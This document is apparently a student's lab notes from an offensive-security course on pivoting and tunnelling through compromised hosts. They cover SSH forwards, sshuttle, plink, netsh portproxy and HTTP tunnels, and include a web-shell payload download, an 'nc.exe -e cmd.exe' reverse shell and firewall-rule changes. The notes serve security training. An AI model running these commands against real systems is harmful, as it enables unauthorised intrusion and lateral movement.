	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
	Type "help" for help.
	
	postgres=# 
```

## Remote Dynamic Port Forward

Similar to Local Dynamic port forwarding, Remote creates a dynamic port forward but in the remote configuration
- SOCKS proxy port is _bound to the SSH server_
- Traffic is _forwarded from the SSH client_.
- Able to connect to other ports and hosts through the same connection

> OpenSSH _client_ needs to be version 7.6 or above to use it - the server version doesn't matter.

#### Extended Scenario
![](remote_dynamic_port_forward.png)

- Windows server (MULTISERVER03) on the DMZ network.
- Firewall prevents
	- Connecting to any port on MULTISERVER03
	- Any port other than TCP/8090 on CONFLUENCE01 from our Kali machine
- Can SSH _out_ from CONFLUENCE01 _to our Kali machine_, then create a remote dynamic port forward so we can start enumerating MULTISERVER03 from Kali.:
	- SSH session is initiated from CONFLUENCE01, connecting to Kali
	- Kali is running an SSH server
	- SOCKS proxy port is then bound to the Kali machine on TCP/9998.
	- Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01
	- Packets are forwarded based on where they're addressed - in this case, MULTISERVER03.

#### Execution

CONFLUENCE01 - **192.168.228.63**
PGDATABASE01 - **10.4.228.215**
MULTISERVER03 - **192.168.228.64**

- Per previous, gain reverse shell on CONFLUENCE01 via curl & CVE vuln
- Upgrade to TTY
- Start SSH Dynamic Remote Port Forward
```bash
ssh -N -R 9998 kali@192.168.45.196
	Could not create directory '/home/confluence/.ssh'.
	The authenticity of host '192.168.45.196 (192.168.45.196)' can''t be established.
	ECDSA key fingerprint is SHA256:Z6AWTPQLtEMVjOkkRmrchK5U1cx9L6Dek+5Gx8+icic.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	yes
	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
	kali@192.168.45.196''s password:
```

- Edit proxychains config file and exploit
```bash
sudo vim /etc/proxychains4.conf
	# Last line
	socks5 127.0.0.1 9998


proxychains nmap -vvv -sT -Pn -n --top-ports=20 10.4.228.64
	...
	PORT     STATE  SERVICE       REASON
	21/tcp   closed ftp           conn-refused
	22/tcp   closed ssh           conn-refused
	23/tcp   closed telnet        conn-refused
	25/tcp   closed smtp          conn-refused
	53/tcp   open   domain        syn-ack
	80/tcp   open   http          syn-ack
	110/tcp  closed pop3          conn-refused
	111/tcp  closed rpcbind       conn-refused
	135/tcp  open   msrpc         syn-ack
	139/tcp  closed netbios-ssn   conn-refused
	143/tcp  closed imap          conn-refused
	443/tcp  closed https         conn-refused
	445/tcp  closed microsoft-ds  conn-refused
	993/tcp  closed imaps         conn-refused
	995/tcp  closed pop3s         conn-refused
	1723/tcp closed pptp          conn-refused
	3306/tcp closed mysql         conn-refused
	3389/tcp open   ms-wbt-server syn-ack
	5900/tcp closed vnc           conn-refused
	8080/tcp closed http-proxy    conn-refused
	...
```


## sshuttle
- Turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel.
- Requires:
	- **root** privs on the SSH client
	- python3 on SSH server

In situations where we have direct access to an SSH server, behind which is a more complex internal network, classic dynamic port forwarding might be difficult to manage.

#### Scenario
- Have SSH access to PGDATABASE01,
- Can access through a port forward set up on CONFLUENCE01

#### Execution

CONFLUENCE01 - **192.168.154.63**
PGDATABASE01 - **10.4.154.215**
HRSHARES - **172.16.154.217**

- Set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN interface and forwarding to port 22 on PGDATABASE01
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.154.215:22
```

- Run **sshuttle**, specifying the SSH connection string we want to use, & the subnets that we want to tunnel through this connection
	- PGDATABASE01 - **10.4.154.0/24** and HRSHARES - **172.16.154.0/24**)
```bash
sshuttle -r database_admin@192.168.154.63:2222 10.4.154.0/24 172.16.154.0/24
	The authenticity of host '[192.168.154.63]:2222 ([192.168.154.63]:2222)' can't be established.
	ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
	This host key is known by the following other names/addresses:
	    ~/.ssh/known_hosts:3: [hashed name]
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '[192.168.154.63]:2222' (ED25519) to the list of known hosts.
	database_admin@192.168.154.63's password: 
	c : Connected to server.
```

> Any requests made to hosts in the subnets specified will be pushed transparently through the SSH connection

- Test by connecting to the smb shares on HRSHARES via a new Kali tab
```bash
smbclient -L //172.16.154.217/ -U hr_admin --password=Welcome1234
	        Sharename       Type      Comment
	        ---------       ----      -------
	        ADMIN$          Disk      Remote Admin
	        C$              Disk      Default share
	        IPC$            IPC       Remote IPC
	        Scripts         Disk      
	        Users           Disk      
	Reconnecting with SMB1 for workgroup listing.
	do_connect: Connection to 172.16.154.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
	Unable to connect with SMB1 -- no workgroup available
```


## Windows

### ssh.exe

- **%systemdrive%\\Windows\\System32\\OpenSSH**
	- Default directory for SSH Utilities (ssh, scp, sftp, etc)
- Requires v7.6 or higher

#### Scenario
![](ssh-tunnel-windows.png)

#### Execution

- Start up an SSH server on Kali
```bash
sudo systemctl start ssh
```

- RDP into MULTISERVER03 w/ previously found credentials
```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.216.64
```

- Find ssh, check version, & create a dynamic port forward to kali
```powershell
where ssh
	C:\Windows\System32\OpenSSH\ssh.exe

ssh.exe -V
	OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2

ssh -N -r 9998 kali@192.168.45.204
	The authenticity of host '192.168.45.204 (192.168.45.204)' can't be established.
	ECDSA key fingerprint is SHA256:Z6AWTPQLtEMVjOkkRmrchK5U1cx9L6Dek+5Gx8+icic.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '192.168.45.204' (ECDSA) to the list of known hosts.
	kali@192.168.45.204's password:
```

- Verify connection on Kali
```bash
ss -ntplu
	Netid          State           Recv-Q          Send-Q                   Local Address:Port                      Peer Address:Port          Process
	udp            UNCONN          0               0                              0.0.0.0:34960                          0.0.0.0:*
	tcp            LISTEN          0               128                          127.0.0.1:9998                           0.0.0.0:*
```

- Update proxychains conf to use the socket
```bash
sudo vim /etc/proxychains4.conf
	...
	[ProxyList]
	# add proxy here ...
	# meanwile
	# defaults set to "tor"
	# socks4        127.0.0.1 9050
	socks5 127.0.0.1 9998
```

- Use proxychains on Kali to connect to the PostgreSQL db
```bash
proxychains psql -h 10.4.216.215 -U postgres
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	[proxychains] DLL init: proxychains-ng 4.17
	[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.216.215:5432  ...  OK
	Password for user postgres: 
	[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.216.215:5432  ...  OK
	psql (16.2 (Debian 16.2-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
	Type "help" for help.
	
postgres=#
```


## plink
- Command-line counterpart to Putty
- Doesn't have remote dynamic port forwarding (verify)

#### Scenario
- Compromise MULTISERVER03 through the web application
- Drop a _web shell_ on it, and gain a reverse shell using that.
- Use to previously discovered creds connect to the RDP service
	- This is blocked by the firewall, so we can't connect directly.

#### Execution
![](plink.png)

- Get an interactive reverse shell from MULTISERVER03
	- From our initial exploitation, we uploaded a basic web shell at **/umbraco/forms.aspx**.
	- Browse to the URL and run whatever Windows commands wanted (will be run as the _iis apppool\\defaultapppool_ user).

- Start webserver on Kali to host **nc.exe** and **plink.exe**
```bash
sudo systemctl start apache2

find / -name nc.exe 2>/dev/null
	/usr/share/windows-resources/binaries/nc.exe

sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/

find / -name plink.exe 2>/dev/null
	/usr/share/windows-resources/binaries/plink.exe

sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```

- Use MULTISERVER03 web shell to download **nc.exe** and **plink.exe** and then use to send a reverse shell back to Kali.
```bash
powershell wget -Uri http://192.168.45.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
powershell wget -Uri http://192.168.45.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

- Set up **nc** listener on Kali
```bash
nc -nlvp 4446
```
\
- Using webshell, execute **nc** for reverse shell
```bash
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.4 4446
```

- Set up Plink with a remote port forward in order to access the MULTISERVER03 RDP port from Kali
```bash
C:\Windows\Temp\plink.exe -ssh -l kali -pw [password] -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.161
The host key is not cached for this server:
  192.168.118.4 (port 22)
You have no guarantee that the server is the computer
you think it is.
The server''s ssh-ed25519 key fingerprint is:
  ssh-ed25519 255 SHA256:q1QQjIxHhSFXfEIT4gYrRF+zKr0bcLMOJljoINxThxY
If you trust this host, enter "y" to add the key to
PuTTY''s cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "kali".
Linux kali 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 21 15:50:39 2022 from 192.168.50.64
kali@kali:~$ 
```
	- After the **-R** option
		- The socket to open on the Kali SSH server
		- The RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to <kali IP>.
	- We will also pass the username (**-l**) and password (**-pw**) directly on the command line.

> With limited shells (like non-tty Linux ones), you may not be able to enter a response for the `Store key in cache` request.
> Automate the confirmation with `cmd.exe /c echo y`, piped into the **plink.exe** command. This will emulate the confirmation that we usually type when prompted. The entire command would be: `cmd.exe /c echo y | plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 <kali ip>`

- RDP into the server
```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```


## netsh
- Requires admin privs to create a port forward on Windows

#### Scenario
![](netsh_forward.png)
- MULTISERVER03
	- Serving its webapp on 80
	- FW allows inbound RDP
- CONFLUENCE01 isn't accessible on the WAN interface
- Want to SSH directly from Kali to PGDATABASE01
  
  
- MULTISERVER03 - **192.168.181.64**
- PGDATABASE01 - **10.4.181.215**

#### Execution
- Create a port forward on MULTISERVER03 that will listen on the WAN interface and forward packets to the SSH port on PGDATABASE01.

Can set up a port forward with the portproxy subcontext within the interface context.
- Contexts
	- Netsh interacts with other operating system components by using dynamic-link library (DLL) files.
	  Each netsh helper DLL provides an extensive set of features called a context, which is a group of commands specific to a networking server role or feature.
- PortProxy 
	- Commands to act as proxies between IPv4 and IPv6 networks and applications


>The _portproxy_ subcontext of the _netsh interface_ command requires administrative privileges to make any changes.
>This means that in most cases we will need to take UAC into account.
>In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern.
>However, we should bear in mind that UAC may be a stumbling block in other setups.


- Start by RDP'ing intow MULTISERVER03 & run cmd as admin
```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.181.64
```

- Set up port forward via netsh
```powershell
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.181.64 connectport=22 connectaddress=10.4.181.215
```
	- Instruct *netsh interface* to *add* a *portproxy* rule from an IPv4 listener that is forwarded to an IPv4 port (*v4tov4*)
	- This will listen on port 2222 on the external-facing interface (**listenport=2222 listenaddress=192.168.181.64**)
	- Forward packets to port 22 on PGDATABASE01 (**connectport=22 connectaddress=10.4.181.215**)

- Confirm
```powershell
# On MULTISERVER03
netstat -anp TCP | find "2222"
  TCP    192.168.181.64:2222    0.0.0.0:0              LISTENING

netsh interface portproxy show all
	Listen on ipv4:             Connect to ipv4:
	
	Address         Port        Address         Port
	--------------- ----------  --------------- ----------
	192.168.181.64   2222        10.4.181.215     22
```
```bash
# In Kali
sudo nmap -Pn -n -p 2222 192.168.181.64
	...
	PORT     STATE    SERVICE
	2222/tcp filtered EtherNetIP-1
```
	- Note, state is filtered - likely FW blocking inbound connection directly to port 2222.
	- In order to access, we'll need to change the FW rules to allow


- Add FW rule to allow inbound 2222 connections & confirm
	- Use a memorable name for easy deletion afterwards
```powershell
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.181.64 localport=2222 action=allow
	Ok
```

- Confirm in Kali
```bash
sudo nmap -Pn -n -p 2222 192.168.181.64
	...
	PORT     STATE SERVICE
	2222/tcp open  EtherNetIP-1
```

- SSH into PGDATABASE01
```bash
ssh database_admin@192.168.50.64 -p2222
	...
	Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
	database_admin@pgdatabase01:~$
```

#### Cleanup
It's very important to cleanup after altering an endpoint/ environment in any way
  
- Delete the added FW rule
```powershell
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
	Deleted 1 rule(s).
	Ok
```

- Delete created port forward
```powershell
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.181.64
```



# Removed from course

### RINETD:


Port forwarding tool that'll redirect traffic. Helps w/ data transfer  
  
add bindaddress, bindport (<- listeners), connectaddress, connectport (<-destination) to _/etc/rinetd.conf_ on web-accessible or attack machine  
```bash
vim /etc/rinetd.conf
...
	0.0.0.0 80 8.8.8.8 80
...
```

  
connect to web-accessible or attack machine from victim/ no-web machine.  
```bash
nc -nvv 192.168.119.126 80  
	(UNKNOWN) [192.168.119.126] 80 (http) open  
	GET / HTTP/1.0  
  
	HTTP/1.0 200 OK  
	Date: Fri, 27 Jan 2023 18:48:07 GMT  
	...  
	Set-Cookie: ... domain=.google.com; Secure
	```



### SSH Tunneling_old:
![[tunneling.png]]

Most popular for tunneling and port forwarding.  
	- Ability to create encrypted tunnels  
	- Supports bi-directional comm channels  
  
  
##### LOCAL:  
  
Scenario:  
	During a test, we've compromised a Linux-based target through a remote vuln. Elevated to root, & got the pws for all users.  
	Compromised machine doesn't appear to have any outbound traffic filtering. Only exposes SSH, RDP, & vuln service port. -- Also allowed on the firewall.  
	After enum, discover an additional nic connected to a different network. In this internal subnet, there's a WinServer 2016 that has network shares available.  
  
Ex:  
```bash
# SSH Scenario  
iptables -F  
iptables -P INPUT DROP  
iptables -P FORWARD DROP  
iptables -A INPUT -i lo -j ACCEPT  
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  
iptables -A INPUT -p tcp --dport 3389 -m state --state NEW -j ACCEPT  
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT  
iptables -A INPUT -p tcp --dport 8080 -m state --state NEW -j ACCEPT  
iptables -A INPUT -i lo -j ACCEPT
```


Rather than moving needed tools to the machine then attempt to interact w/ the shares on the server,  
we'll want to interact with this new target from our attack machine, pivoting thorugh this compromised Linux client. 

Gives us all the tool access we need:  
```bash
ssh -N -L [bind_address:]port:host:hostport [username@address]
```
	**-N** - Do not execute a remote command (useful when just forwarding ports)  
	**-L** - Specifies local host port that'll be forwarded to a remote address & port  
  
  
Given our scenario: Forward port 445 (NetBIOS) on attack to port 445 on Server2016  
	Allows any file sharing queries directed at our attack maching will be forwarded to the Server target.  
	Even though port 445 is blocked by the FW, it's tunneled through an SSH session on 22 (which is allowed)
  
![[ssh-tunnel.png]]
  
As Server2016 no longer supports SMBv1, change samba config to set minimum version to SMBv2:  
```bash
sudo vim /etc/samba/smb.conf  
	...  
	min protocol = SMB2  
	[EOF]  
  
sudo /etc/init.d/smbd restart
```
 

### Plink.exe

Scenario:  
	We've gained access to a Windows10 machine during our assessment through a vuln in Sync Breeze & have obtained a SYSTEM-level reverse shell.  
	During enum (**netstat -anpb TCP**) we discover MySQL running on 3306.  
	Transfer [plink.exe](plink.exe.md) to the target  
  
Ex:  
```bash
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```
.
	**-ssh** - Connect via SSH  
	**-l** - As kali user  
	**-pw** - With password ‘ilak’  
	**-R** - Create a remote port forward of 10.11.0.4's port 1234 to the MySQL port (3306) on the Window's target (127.0.0.1)  
  
  
**cmd.exe /c echo y** - As first time plink connects to a host, it'll attempt to cache the host key in the registry.  
	Likely we won't have the necessary interactivity w/in our remote shell, hence this addition.  
  
  
With **plink** set up through our remote shell on the Win box, we can attack via our target:  
```bash
sudo nmap -sS -sV 127.0.0.1 -p 1234  
	...  
	PORT     STATE SERVICE VERSION  
	1234/tcp open  mysql   MySQL 5.5.5-10.1.31-MariaDB
```
****NOTE: Make sure ssh.service is started on kali first. & make sure MySQL is started on Win first.  
  
  
  
### NETSH

Scenario:  
	Compromised Win10 (10.11.0.22) & privesc, 2 nic's & a Win Server2016 (192.168.1.110) w/ port 445 open.  
	Since we're SYSTEM on Win10, we don't deal w/ UAC.  
  
****NOTE: For this to work, the Windows system must have the _**IPHelper**_ service running and _**IPv6**_ support must be enabled for the interface we want to use.  

```powershell
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110  
  
netstat -anp TCP | find "4455"                                                
	TCP    10.11.0.22:4455        0.0.0.0:0              LISTENING  
```
.  
	**v4tov4** - IPv4-to-IPv4  
	**portproxy** - Proxy  
	**listenaddress=10.11.0.22** - Listener IP (Win10)  
	**listenport**=**4455** - Listener port (Win10)  
	**connectaddress=192.168.1.110** - Connector IP (Server2016)  
	**connectport=445** - Connector port (Server2016)  
  
  
By default, the FW will block use of our tunnel (disallows inbound traffic on 4455).  
Since we're SYSTEM, we'll change FW rules:  
```powershell
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow  
	Ok.
```

  
Try to connect through SAMBA:  
```bash
smbclient -L 10.11.0.22 --port=4455 --user=Administrator  
Password for [WORKGROUP\Administrator]:  
  
        Sharename       Type      Comment  
        ---------       ----      -------  
        ADMIN$          Disk      Remote Admin  
        C$              Disk      Default share  
        Data            Disk        
        IPC$            IPC       Remote IPC  
        NETLOGON        Disk      Logon server share   
        SYSVOL          Disk      Logon server share   
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to 192.168.126.10 failed (Error NT_STATUS_IO_TIMEOUT)  
Unable to connect with SMB1 -- no workgroup available  
```
	***NOTE (Not error shown): If this doesn't work, ensure _/etc/samba/smb.conf_ has “min protocol SMB2” in it.  
  
  
Timeout error usually due to a port forwarding error.  
  
**BUT**, we can still mount & interact w/ the share:  
```bash
sudo mkdir /mnt/win10_share  
  
sudo mount -v -t cifs -o unc=\\\\10.11.0.22\\Data,port=4455,vers=3,username=Administrator,password=lab /mnt/Win10share  
  
ls -l /mnt/win10_share/  
	total 1  
	-rwxr-xr-x 1 root root 7 Apr 17  2019 data.txt  
  
cat /mnt/win10_share/data.txt  
	data 
```

****NOTE: If there's an _/etc/fstab_ error, you'll need to add the mount point to the _/etc/fstab_ file  
```bash
//192.168.126.10/Data /mnt/Win10share cifs defaults,vers=3 0 0
```


 
### HTTP Tunneling:

Scenario:  
	Compromised Linux server, elevated privs to root, & gained access to all pwds.  
	Discovered a WinServer 2016 web server on internal network.  
	(for this example, assume a deep packet content inspection feature has been implemented that'll only allow HTTP protocol)  
	SSH-based tunnels won't work btw the server & attack box (will work fine on internal networked machines)  
	Firewall btw Linux server & Kali only allows 80, 443, 1234 in/out.  
	80 & 443 - web server; 1234 - oversight & not mapped to any listening port in the internal network.  
  
  
Goal: Initiate a remote desktop connection from our attack machine to the Win Server2016 through the compromised Linux server only using HTTP.  
  
We'll put **hts** on compromised Linux server (s.t.u.v) & **htc** on attack box (a.b.c.d) & and SSH tunnel btw Linux server (s.t.u.v) and Server2016 (w.x.y.z)   
  
![[httptunnel.png]]
  

Add an SSH port forward from our compromised Linux server (s.t.u.v) on the internal network to the Server2016 (w.x.y.z) (student@debian):
```bash
ssh -L 0.0.0.0:8888:<Server2016_IP>:3389 student@127.0.0.1
```
  
Create an HTTP-based tunnel btw machines:  
	Input will be on our attack maching (kali) @ 8080  
```bash
htc --forward-port 8080 <LinuxServer_IP>:1234
```

  Output will be on compromised Linux box (student@debian) on 1234 (across the FW):
```bash
hts --forward-port localhost:8888 1234
```

HTTP requests will be decapsulated & handed off to the listening port (Linux server 8888) (run on kali):
```bash
rdesktop 127.0.0.1:8080
```


(*NOTE: Got Server2016 to rdesktop, but there was no interacting w/ it. *could be my comp? it seemed pretty laggy)